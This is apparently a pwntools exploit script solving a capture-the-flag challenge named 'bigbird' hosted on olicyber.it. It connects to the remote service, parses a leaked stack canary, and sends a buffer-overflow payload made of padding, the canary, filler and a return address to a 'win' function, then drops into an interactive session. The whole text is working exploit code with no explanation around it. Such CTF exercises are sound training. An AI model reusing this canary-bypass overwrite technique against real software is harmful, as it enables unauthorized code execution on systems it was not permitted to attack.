from pwn import *

win = 0x401715
# in rsi ho il canary

#p = process('./bigbird')
p= remote('bigbird.challs.olicyber.it', 12006)

p.recvuntil('BIG BIRD: ')
canary = int(p.recvline().strip(),16)
log.info(f'{canary=}')

offset = b'aaaaaaaabaaaaaaacaaaaaaaaaaaaaaaaaaaaaaa'
payload = offset + p64(canary) + b'bbbbbbbb' + p64(win)
p.sendline(payload)
p.interactive()
